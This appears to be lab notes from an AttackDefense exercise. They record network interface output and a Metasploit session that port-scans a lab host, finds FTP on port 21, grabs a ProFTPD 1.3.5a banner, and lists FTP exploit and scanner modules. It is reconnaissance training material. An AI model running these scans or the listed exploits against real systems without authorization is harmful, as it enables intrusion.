[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
13554: eth0@if13555: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.7/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
13557: eth1@if13558: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:5a:c9:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.90.201.2/24 brd 192.90.201.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[ifconfig]]

```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.7  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:07  txqueuelen 0  (Ethernet)
        RX packets 127  bytes 11296 (11.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 103  bytes 313651 (306.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.90.201.2  netmask 255.255.255.0  broadcast 192.90.201.255
        ether 02:42:c0:5a:c9:02  txqueuelen 0  (Ethernet)
        RX packets 15  bytes 1306 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

[[metasploit]]

```
root@attackdefense:~# service postgresql status
11/main (port 5432): down
root@attackdefense:~# service postgresql start && msfconsole
[ ok ] Starting PostgreSQL 11 database server: main.
       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > msf5 > db_status 
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a ftp_enum
[*] Added workspace: ftp_enum
[*] Workspace: ftp_enum
msf5 > workspace
  default
* ftp_enum
msf5 > 
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   1  auxiliary/scanner/http/wordpress_pingback_access                   normal  Yes    Wordpress Pingback Locator
   2  auxiliary/scanner/natpmp/natpmp_portscan                           normal  Yes    NAT-PMP External Port Scanner
   3  auxiliary/scanner/portscan/ack                                     normal  Yes    TCP ACK Firewall Scanner
   4  auxiliary/scanner/portscan/ftpbounce                               normal  Yes    FTP Bounce Port Scanner
   5  auxiliary/scanner/portscan/syn                                     normal  Yes    TCP SYN Port Scanner
   6  auxiliary/scanner/portscan/tcp                                     normal  Yes    TCP Port Scanner
   7  auxiliary/scanner/portscan/xmas                                    normal  Yes    TCP "XMas" Port Scanner
   8  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > set rhosts 192.90.201.3
rhosts => 192.90.201.3
msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.90.201.3:         - 192.90.201.3:21 - TCP OPEN
[*] 192.90.201.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/portscan/tcp) > back
msf5 > search ftp

Matching Modules
================

   #    Name                                                Disclosure Date  Rank       Check  Description
   -    ----                                                ---------------  ----       -----  -----------
   1    auxiliary/admin/cisco/vpn_3000_ftp_bypass           2006-08-23       normal     No     Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access
   2    auxiliary/admin/officescan/tmlisten_traversal                        normal     Yes    TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access
   3    auxiliary/admin/tftp/tftp_transfer_util                              normal     No     TFTP File Transfer Utility
   4    auxiliary/dos/scada/d20_tftp_overflow               2012-01-19       normal     No     General Electric D20ME TFTP Server Buffer Overflow DoS
   5    auxiliary/dos/windows/ftp/filezilla_admin_user      2005-11-07       normal     No     FileZilla FTP Server Admin Interface Denial of Service
   6    auxiliary/dos/windows/ftp/filezilla_server_port     2006-12-11       normal     No     FileZilla FTP Server Malformed PORT Denial of Service
   7    auxiliary/dos/windows/ftp/guildftp_cwdlist          2008-10-12       normal     No     Guild FTPd 0.999.8.11/0.999.14 Heap Corruption
   8    auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal     No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   9    auxiliary/dos/windows/ftp/iis_list_exhaustion       2009-09-03       normal     No     Microsoft IIS FTP Server LIST Stack Exhaustion
   10   auxiliary/dos/windows/ftp/solarftp_user             2011-02-22       normal     No     Solar FTP Server Malformed USER Denial of Service
   11   auxiliary/dos/windows/ftp/titan626_site             2008-10-14       normal     No     Titan FTP Server 6.26.630 SITE WHO DoS
   12   auxiliary/dos/windows/ftp/vicftps50_list            2008-10-24       normal     No     Victory FTP Server 5.0 LIST DoS
   13   auxiliary/dos/windows/ftp/winftp230_nlst            2008-09-26       normal     No     WinFTP 2.3.0 NLST Denial of Service
   14   auxiliary/dos/windows/ftp/xmeasy560_nlst            2008-10-13       normal     No     XM Easy Personal FTP Server 5.6.0 NLST DoS
   15   auxiliary/dos/windows/ftp/xmeasy570_nlst            2009-03-27       normal     No     XM Easy Personal FTP Server 5.7.0 NLST DoS
   16   auxiliary/dos/windows/tftp/pt360_write              2008-10-29       normal     No     PacketTrap TFTP Server 2.2.5459.0 DoS
   17   auxiliary/dos/windows/tftp/solarwinds               2010-05-21       normal     No     SolarWinds TFTP Server 10.4.0.10 Denial of Service
   18   auxiliary/fuzzers/ftp/client_ftp                                     normal     No     Simple FTP Client Fuzzer
   19   auxiliary/fuzzers/ftp/ftp_pre_post                                   normal     Yes    Simple FTP Fuzzer
   20   auxiliary/gather/apple_safari_ftp_url_cookie_theft  2015-04-08       normal     No     Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft
   21   auxiliary/gather/d20pass                            2012-01-19       normal     No     General Electric D20 Password Recovery
   22   auxiliary/gather/konica_minolta_pwd_extract                          normal     Yes    Konica Minolta Password Extractor
   23   auxiliary/scanner/ftp/anonymous                                      normal     Yes    Anonymous FTP Access Detection
   24   auxiliary/scanner/ftp/bison_ftp_traversal           2015-09-28       normal     Yes    BisonWare BisonFTP Server 3.5 Directory Traversal Information Disclosure
   25   auxiliary/scanner/ftp/colorado_ftp_traversal        2016-08-11       normal     Yes    ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure
   26   auxiliary/scanner/ftp/easy_file_sharing_ftp         2017-03-07       normal     Yes    Easy File Sharing FTP Server 3.6 Directory Traversal
   27   auxiliary/scanner/ftp/ftp_login                                      normal     Yes    FTP Authentication Scanner
   28   auxiliary/scanner/ftp/ftp_version                                    normal     Yes    FTP Version Scanner
   29   auxiliary/scanner/ftp/konica_ftp_traversal          2015-09-22       normal     Yes    Konica Minolta FTP Utility 1.00 Directory Traversal Information Disclosure
   30   auxiliary/scanner/ftp/pcman_ftp_traversal           2015-09-28       normal     Yes    PCMan FTP Server 2.0.7 Directory Traversal Information Disclosure
   31   auxiliary/scanner/ftp/titanftp_xcrc_traversal       2010-06-15       normal     Yes    Titan FTP XCRC Directory Traversal Information Disclosure
   32   auxiliary/scanner/http/titan_ftp_admin_pwd                           normal     Yes    Titan FTP Administrative Password Disclosure
   33   auxiliary/scanner/misc/zenworks_preboot_fileaccess                   normal     Yes    Novell ZENworks Configuration Management Preboot Service Remote File Access
   34   auxiliary/scanner/portscan/ftpbounce                                 normal     Yes    FTP Bounce Port Scanner
   35   auxiliary/scanner/quake/server_info                                  normal     Yes    Gather Quake Server Information
   36   auxiliary/scanner/rsync/modules_list                                 normal     Yes    List Rsync Modules
   37   auxiliary/scanner/snmp/cisco_config_tftp                             normal     Yes    Cisco IOS SNMP Configuration Grabber (TFTP)
   38   auxiliary/scanner/snmp/cisco_upload_file                             normal     Yes    Cisco IOS SNMP File Upload (TFTP)
   39   auxiliary/scanner/ssh/cerberus_sftp_enumusers       2014-05-27       normal     Yes    Cerberus FTP Server SFTP Username Enumeration
   40   auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp    2011-12-12       normal     Yes    IpSwitch WhatsUp Gold TFTP Directory Traversal
   41   auxiliary/scanner/tftp/netdecision_tftp             2009-05-16       normal     Yes    NetDecision 4.2 TFTP Directory Traversal
   42   auxiliary/scanner/tftp/tftpbrute                                     normal     Yes    TFTP Brute Forcer
   43   auxiliary/server/capture/ftp                                         normal     No     Authentication Capture: FTP
   44   auxiliary/server/ftp                                                 normal     No     FTP File Server
   45   auxiliary/server/pxeexploit                                          normal     No     PXE Boot Exploit Server
   46   auxiliary/server/tftp                                                normal     No     TFTP File Server
   47   auxiliary/server/wget_symlink_file_write            2014-10-27       normal     No     GNU Wget FTP Symlink Arbitrary Filesystem Access
   48   exploit/freebsd/ftp/proftp_telnet_iac               2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   49   exploit/linux/ftp/proftp_sreplace                   2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   50   exploit/linux/ftp/proftp_telnet_iac                 2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   51   exploit/linux/http/cisco_prime_inf_rce              2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   52   exploit/linux/http/linksys_wrt160nv2_apply_exec     2013-02-11       excellent  No     Linksys WRT160nv2 apply.cgi Remote Command Injection
   53   exploit/linux/misc/netsupport_manager_agent         2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   54   exploit/mainframe/ftp/ftp_jcl_creds                 2013-05-12       normal     Yes    FTP JCL Execution
   55   exploit/multi/ftp/pureftpd_bash_env_exec            2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   56   exploit/multi/ftp/wuftpd_site_exec_format           2000-06-22       great      Yes    WU-FTPD SITE EXEC/INDEX Format String Vulnerability
   57   exploit/multi/http/netwin_surgeftp_exec             2012-12-06       good       Yes    Netwin SurgeFTP Remote Command Execution
   58   exploit/multi/http/sit_file_upload                  2011-11-10       excellent  Yes    Support Incident Tracker Remote Command Execution
   59   exploit/multi/wyse/hagent_untrusted_hsdata          2009-07-10       excellent  No     Wyse Rapport Hagent Fake Hserver Command Execution
   60   exploit/osx/browser/safari_file_policy              2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   61   exploit/osx/ftp/webstar_ftp_user                    2004-07-13       average    No     WebSTAR FTP Server USER Overflow
   62   exploit/unix/ftp/proftpd_133c_backdoor              2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   63   exploit/unix/ftp/proftpd_modcopy_exec               2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
   64   exploit/unix/ftp/vsftpd_234_backdoor                2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
   65   exploit/unix/http/tnftp_savefile                    2014-10-28       excellent  No     tnftp "savefile" Arbitrary Command Execution
   66   exploit/unix/local/netbsd_mail_local                2016-07-07       excellent  No     NetBSD mail.local Privilege Escalation
   67   exploit/windows/fileformat/bpftp_client_bps_bof     2014-07-24       normal     No     BulletProof FTP Client BPS Buffer Overflow
   68   exploit/windows/fileformat/iftp_schedule_bof        2014-11-06       normal     No     i-FTP Schedule Buffer Overflow
   69   exploit/windows/ftp/32bitftp_list_reply             2010-10-12       good       No     32bit FTP Client Stack Buffer Overflow 
   70   exploit/windows/ftp/3cdaemon_ftp_user               2005-01-04       average    Yes    3Com 3CDaemon 2.0 FTP Username Overflow
   71   exploit/windows/ftp/aasync_list_reply               2010-10-12       good       No     AASync v2.2.1.0 (Win32) Stack Buffer Overflow (LIST)
   72   exploit/windows/ftp/ability_server_stor             2004-10-22       normal     Yes    Ability Server 2.34 STOR Command Stack Buffer Overflow
   73   exploit/windows/ftp/absolute_ftp_list_bof           2011-11-09       normal     No     AbsoluteFTP 1.9.6 - 2.2.10 LIST Command Remote Buffer Overflow
   74   exploit/windows/ftp/ayukov_nftp                     2017-10-21       normal     No     Ayukov NFTP FTP Client Buffer Overflow
   75   exploit/windows/ftp/bison_ftp_bof                   2011-08-07       normal     Yes    BisonWare BisonFTP Server Buffer Overflow
   76   exploit/windows/ftp/cesarftp_mkd                    2006-06-12       average    Yes    Cesar FTP 0.99g MKD Command Buffer Overflow
   77   exploit/windows/ftp/comsnd_ftpd_fmtstr              2012-06-08       good       Yes    ComSndFTP v1.3.7 Beta USER Format String (Write4) Vulnerability
   78   exploit/windows/ftp/dreamftp_format                 2004-03-03       good       Yes    BolinTech Dream FTP Server 1.02 Format String
   79   exploit/windows/ftp/easyfilesharing_pass            2006-07-31       average    Yes    Easy File Sharing FTP Server 2.0 PASS Overflow
   80   exploit/windows/ftp/easyftp_cwd_fixret              2010-02-16       great      Yes    EasyFTP Server CWD Command Stack Buffer Overflow
   81   exploit/windows/ftp/easyftp_list_fixret             2010-07-05       great      Yes    EasyFTP Server LIST Command Stack Buffer Overflow
   82   exploit/windows/ftp/easyftp_mkd_fixret              2010-04-04       great      Yes    EasyFTP Server MKD Command Stack Buffer Overflow
   83   exploit/windows/ftp/filecopa_list_overflow          2006-07-19       average    No     FileCopa FTP Server Pre 18 Jul Version
   84   exploit/windows/ftp/filewrangler_list_reply         2010-10-12       good       No     FileWrangler 5.30 Stack Buffer Overflow
   85   exploit/windows/ftp/freefloatftp_user               2012-06-12       normal     Yes    Free Float FTP Server USER Command Buffer Overflow
   86   exploit/windows/ftp/freefloatftp_wbem               2012-12-07       excellent  Yes    FreeFloat FTP Server Arbitrary File Upload
   87   exploit/windows/ftp/freeftpd_pass                   2013-08-20       normal     Yes    freeFTPd PASS Command Buffer Overflow
   88   exploit/windows/ftp/freeftpd_user                   2005-11-16       average    Yes    freeFTPd 1.0 Username Overflow
   89   exploit/windows/ftp/ftpgetter_pwd_reply             2010-10-12       good       No     FTPGetter Standard v3.55.0.05 Stack Buffer Overflow (PWD)
   90   exploit/windows/ftp/ftppad_list_reply               2010-10-12       good       No     FTPPad 1.2.0 Stack Buffer Overflow
   91   exploit/windows/ftp/ftpshell51_pwd_reply            2010-10-12       good       No     FTPShell 5.1 Stack Buffer Overflow
   92   exploit/windows/ftp/ftpshell_cli_bof                2017-03-04       normal     No     FTPShell client 6.70 (Enterprise edition) Stack Buffer Overflow
   93   exploit/windows/ftp/ftpsynch_list_reply             2010-10-12       good       No     FTP Synchronizer Professional 4.0.73.274 Stack Buffer Overflow
   94   exploit/windows/ftp/gekkomgr_list_reply             2010-10-12       good       No     Gekko Manager FTP Client Stack Buffer Overflow
   95   exploit/windows/ftp/globalscapeftp_input            2005-05-01       great      No     GlobalSCAPE Secure FTP Server Input Overflow
   96   exploit/windows/ftp/goldenftp_pass_bof              2011-01-23       average    Yes    GoldenFTP PASS Stack Buffer Overflow
   97   exploit/windows/ftp/httpdx_tolog_format             2009-11-17       great      Yes    HTTPDX tolog() Function Format String Vulnerability
   98   exploit/windows/ftp/kmftp_utility_cwd               2015-08-23       normal     Yes    Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow
   99   exploit/windows/ftp/labf_nfsaxe                     2017-05-15       normal     No     LabF nfsAxe 3.7 FTP Client Stack Buffer Overflow
   100  exploit/windows/ftp/leapftp_list_reply              2010-10-12       good       No     LeapFTP 3.0.1 Stack Buffer Overflow
   101  exploit/windows/ftp/leapftp_pasv_reply              2003-06-09       normal     No     LeapWare LeapFTP v2.7.3.600 PASV Reply Client Overflow
   102  exploit/windows/ftp/ms09_053_ftpd_nlst              2009-08-31       great      No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
   103  exploit/windows/ftp/netterm_netftpd_user            2005-04-26       great      Yes    NetTerm NetFTPD USER Buffer Overflow
   104  exploit/windows/ftp/odin_list_reply                 2010-10-12       good       No     Odin Secure FTP 4.1 Stack Buffer Overflow (LIST)
   105  exploit/windows/ftp/open_ftpd_wbem                  2012-06-18       excellent  Yes    Open-FTPD 1.2 Arbitrary File Upload
   106  exploit/windows/ftp/oracle9i_xdb_ftp_pass           2003-08-18       great      Yes    Oracle 9i XDB FTP PASS Overflow (win32)
   107  exploit/windows/ftp/oracle9i_xdb_ftp_unlock         2003-08-18       great      Yes    Oracle 9i XDB FTP UNLOCK Overflow (win32)
   108  exploit/windows/ftp/pcman_put                       2015-08-07       normal     Yes    PCMAN FTP Server Buffer Overflow - PUT Command
   109  exploit/windows/ftp/pcman_stor                      2013-06-27       normal     Yes    PCMAN FTP Server Post-Authentication STOR Command Stack Buffer Overflow
   110  exploit/windows/ftp/proftp_banner                   2009-08-25       normal     No     ProFTP 2.9 Banner Remote Buffer Overflow
   111  exploit/windows/ftp/quickshare_traversal_write      2011-02-03       excellent  Yes    QuickShare File Server 1.2.1 Directory Traversal Vulnerability
   112  exploit/windows/ftp/ricoh_dl_bof                    2012-03-01       normal     Yes    Ricoh DC DL-10 SR10 FTP USER Command Buffer Overflow
   113  exploit/windows/ftp/sami_ftpd_list                  2013-02-27       low        No     Sami FTP Server LIST Command Buffer Overflow
   114  exploit/windows/ftp/sami_ftpd_user                  2006-01-24       normal     Yes    KarjaSoft Sami FTP Server v2.02 USER Overflow
   115  exploit/windows/ftp/sasser_ftpd_port                2004-05-10       average    No     Sasser Worm avserve FTP PORT Buffer Overflow
   116  exploit/windows/ftp/scriptftp_list                  2011-10-12       good       No     ScriptFTP LIST Remote Buffer Overflow
   117  exploit/windows/ftp/seagull_list_reply              2010-10-12       good       No     Seagull FTP v3.3 Build 409 Stack Buffer Overflow
   118  exploit/windows/ftp/servu_chmod                     2004-12-31       normal     Yes    Serv-U FTP Server Buffer Overflow
   119  exploit/windows/ftp/servu_mdtm                      2004-02-26       good       Yes    Serv-U FTPD MDTM Overflow
   120  exploit/windows/ftp/slimftpd_list_concat            2005-07-21       great      No     SlimFTPd LIST Concatenation Overflow
   121  exploit/windows/ftp/trellian_client_pasv            2010-04-11       normal     No     Trellian FTP Client 3.01 PASV Remote Buffer Overflow
   122  exploit/windows/ftp/turboftp_port                   2012-10-03       great      Yes    Turbo FTP Server 1.30.823 PORT Overflow
   123  exploit/windows/ftp/vermillion_ftpd_port            2009-09-23       great      Yes    Vermillion FTP Daemon PORT Command Memory Corruption
   124  exploit/windows/ftp/warftpd_165_pass                1998-03-19       average    No     War-FTPD 1.65 Password Overflow
   125  exploit/windows/ftp/warftpd_165_user                1998-03-19       average    No     War-FTPD 1.65 Username Overflow
   126  exploit/windows/ftp/wftpd_size                      2006-08-23       average    No     Texas Imperial Software WFTPD 3.23 SIZE Overflow
   127  exploit/windows/ftp/winaxe_server_ready             2016-11-03       good       No     WinaXe 7.7 FTP Client Remote Buffer Overflow
   128  exploit/windows/ftp/wing_ftp_admin_exec             2014-06-19       excellent  Yes    Wing FTP Server Authenticated Command Execution
   129  exploit/windows/ftp/wsftp_server_503_mkd            2004-11-29       great      Yes    WS-FTP Server 5.03 MKD Overflow
   130  exploit/windows/ftp/wsftp_server_505_xmd5           2006-09-14       average    Yes    Ipswitch WS_FTP Server 5.05 XMD5 Overflow
   131  exploit/windows/ftp/xftp_client_pwd                 2010-04-22       normal     No     Xftp FTP Client 3.0 PWD Remote Buffer Overflow
   132  exploit/windows/ftp/xlink_client                    2009-10-03       normal     No     Xlink FTP Client Buffer Overflow
   133  exploit/windows/ftp/xlink_server                    2009-10-03       good       Yes    Xlink FTP Server Buffer Overflow
   134  exploit/windows/http/easyfilesharing_post           2017-06-12       normal     No     Easy File Sharing HTTP Server 7.2 POST Buffer Overflow
   135  exploit/windows/http/easyfilesharing_seh            2015-12-02       normal     No     Easy File Sharing HTTP Server 7.2 SEH Overflow
   136  exploit/windows/http/easyftp_list                   2010-02-18       great      Yes    EasyFTP Server list.html path Stack Buffer Overflow
   137  exploit/windows/http/httpdx_tolog_format            2009-11-17       great      Yes    HTTPDX tolog() Function Format String Vulnerability
   138  exploit/windows/local/pxeexploit                    2011-08-05       excellent  No     PXE Exploit Server
   139  exploit/windows/misc/altiris_ds_sqli                2008-05-15       normal     Yes    Symantec Altiris DS SQL Injection
   140  exploit/windows/misc/netcat110_nt                   2004-12-27       great      No     Netcat v1.10 NT Stack Buffer Overflow
   141  exploit/windows/mssql/mssql_payload                 2000-05-30       excellent  Yes    Microsoft SQL Server Payload Execution
   142  exploit/windows/mssql/mssql_payload_sqli            2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
   143  exploit/windows/novell/zenworks_preboot_op21_bof    2010-03-30       normal     No     Novell ZENworks Configuration Management Preboot Service 0x21 Buffer Overflow
   144  exploit/windows/ssh/freeftpd_key_exchange           2006-05-12       average    No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow
   145  exploit/windows/tftp/attftp_long_filename           2006-11-27       average    No     Allied Telesyn TFTP Server 1.9 Long Filename Overflow
   146  exploit/windows/tftp/distinct_tftp_traversal        2012-04-08       excellent  No     Distinct TFTP 3.10 Writable Directory Traversal Execution
   147  exploit/windows/tftp/dlink_long_filename            2007-03-12       good       No     D-Link TFTP 1.0 Long Filename Buffer Overflow
   148  exploit/windows/tftp/futuresoft_transfermode        2005-05-31       average    No     FutureSoft TFTP Server 2000 Transfer-Mode Overflow
   149  exploit/windows/tftp/netdecision_tftp_traversal     2009-05-16       excellent  No     NetDecision 4.2 TFTP Writable Directory Traversal Execution
   150  exploit/windows/tftp/opentftp_error_code            2008-07-05       average    No     OpenTFTP SP 1.4 Error Packet Overflow
   151  exploit/windows/tftp/quick_tftp_pro_mode            2008-03-27       good       No     Quick FTP Pro 2.1 Transfer-Mode Overflow
   152  exploit/windows/tftp/tftpd32_long_filename          2002-11-19       average    No     TFTPD32 Long Filename Buffer Overflow
   153  exploit/windows/tftp/tftpdwin_long_filename         2006-09-21       great      No     TFTPDWIN v0.4.2 Long Filename Buffer Overflow
   154  exploit/windows/tftp/tftpserver_wrq_bof             2008-03-26       normal     No     TFTP Server for Windows 1.4 ST WRQ Buffer Overflow
   155  exploit/windows/tftp/threectftpsvc_long_mode        2006-11-27       great      No     3CTftpSvc TFTP Long Mode Buffer Overflow
   156  payload/windows/download_exec                                        normal     No     Windows Executable Download (http,https,ftp) and Execute
   157  post/multi/gather/filezilla_client_cred                              normal     No     Multi Gather FileZilla FTP Client Credential Collection
   158  post/multi/gather/netrc_creds                                        normal     No     UNIX Gather .netrc Credentials
   159  post/windows/gather/credentials/bulletproof_ftp                      normal     No     Windows Gather BulletProof FTP Client Saved Password Extraction
   160  post/windows/gather/credentials/coreftp                              normal     No     Windows Gather CoreFTP Saved Password Extraction
   161  post/windows/gather/credentials/filezilla_server                     normal     No     Windows Gather FileZilla FTP Server Credential Collection
   162  post/windows/gather/credentials/flashfxp                             normal     No     Windows Gather FlashFXP Saved Password Extraction
   163  post/windows/gather/credentials/ftpnavigator                         normal     No     Windows Gather FTP Navigator Saved Password Extraction
   164  post/windows/gather/credentials/ftpx                                 normal     No     Windows Gather FTP Explorer (FTPX) Credential Extraction
   165  post/windows/gather/credentials/idm                                  normal     No     Windows Gather Internet Download Manager (IDM) Password Extractor
   166  post/windows/gather/credentials/smartftp                             normal     No     Windows Gather SmartFTP Saved Password Extraction
   167  post/windows/gather/credentials/total_commander                      normal     No     Windows Gather Total Commander Saved Password Extraction
   168  post/windows/gather/credentials/wsftp_client                         normal     No     Windows Gather WS_FTP Saved Password Extraction
   169  post/windows/manage/pxeexploit                                       normal     No     Windows Manage PXE Exploit Server


msf5 > use auxiliary/scanner/ftp/ftp_version
msf5 auxiliary(scanner/ftp/ftp_version) > options

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads

msf5 auxiliary(scanner/ftp/ftp_version) > set rhosts 192.90.201.3
rhosts => 192.90.201.3
msf5 auxiliary(scanner/ftp/ftp_version) > run

[+] 192.90.201.3:21       - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.90.201.3]\x0d\x0a'
[*] 192.90.201.3:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ftp/ftp_version) > back

msf5 > search type:auxiliary name:ftp

Matching Modules
================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   1   auxiliary/admin/cisco/vpn_3000_ftp_bypass         2006-08-23       normal  No     Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access
   2   auxiliary/admin/tftp/tftp_transfer_util                            normal  No     TFTP File Transfer Utility
   3   auxiliary/dos/scada/d20_tftp_overflow             2012-01-19       normal  No     General Electric D20ME TFTP Server Buffer Overflow DoS
   4   auxiliary/dos/windows/ftp/filezilla_admin_user    2005-11-07       normal  No     FileZilla FTP Server Admin Interface Denial of Service
   5   auxiliary/dos/windows/ftp/filezilla_server_port   2006-12-11       normal  No     FileZilla FTP Server Malformed PORT Denial of Service
   6   auxiliary/dos/windows/ftp/guildftp_cwdlist        2008-10-12       normal  No     Guild FTPd 0.999.8.11/0.999.14 Heap Corruption
   7   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof      2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   8   auxiliary/dos/windows/ftp/iis_list_exhaustion     2009-09-03       normal  No     Microsoft IIS FTP Server LIST Stack Exhaustion
   9   auxiliary/dos/windows/ftp/solarftp_user           2011-02-22       normal  No     Solar FTP Server Malformed USER Denial of Service
   10  auxiliary/dos/windows/ftp/titan626_site           2008-10-14       normal  No     Titan FTP Server 6.26.630 SITE WHO DoS
   11  auxiliary/dos/windows/ftp/vicftps50_list          2008-10-24       normal  No     Victory FTP Server 5.0 LIST DoS
   12  auxiliary/dos/windows/ftp/winftp230_nlst          2008-09-26       normal  No     WinFTP 2.3.0 NLST Denial of Service
   13  auxiliary/dos/windows/ftp/xmeasy560_nlst          2008-10-13       normal  No     XM Easy Personal FTP Server 5.6.0 NLST DoS
   14  auxiliary/dos/windows/ftp/xmeasy570_nlst          2009-03-27       normal  No     XM Easy Personal FTP Server 5.7.0 NLST DoS
   15  auxiliary/dos/windows/tftp/pt360_write            2008-10-29       normal  No     PacketTrap TFTP Server 2.2.5459.0 DoS
   16  auxiliary/dos/windows/tftp/solarwinds             2010-05-21       normal  No     SolarWinds TFTP Server 10.4.0.10 Denial of Service
   17  auxiliary/fuzzers/ftp/client_ftp                                   normal  No     Simple FTP Client Fuzzer
   18  auxiliary/fuzzers/ftp/ftp_pre_post                                 normal  Yes    Simple FTP Fuzzer
   19  auxiliary/scanner/ftp/anonymous                                    normal  Yes    Anonymous FTP Access Detection
   20  auxiliary/scanner/ftp/bison_ftp_traversal         2015-09-28       normal  Yes    BisonWare BisonFTP Server 3.5 Directory Traversal Information Disclosure
   21  auxiliary/scanner/ftp/colorado_ftp_traversal      2016-08-11       normal  Yes    ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure
   22  auxiliary/scanner/ftp/easy_file_sharing_ftp       2017-03-07       normal  Yes    Easy File Sharing FTP Server 3.6 Directory Traversal
   23  auxiliary/scanner/ftp/ftp_login                                    normal  Yes    FTP Authentication Scanner
   24  auxiliary/scanner/ftp/ftp_version                                  normal  Yes    FTP Version Scanner
   25  auxiliary/scanner/ftp/konica_ftp_traversal        2015-09-22       normal  Yes    Konica Minolta FTP Utility 1.00 Directory Traversal Information Disclosure
   26  auxiliary/scanner/ftp/pcman_ftp_traversal         2015-09-28       normal  Yes    PCMan FTP Server 2.0.7 Directory Traversal Information Disclosure
   27  auxiliary/scanner/ftp/titanftp_xcrc_traversal     2010-06-15       normal  Yes    Titan FTP XCRC Directory Traversal Information Disclosure
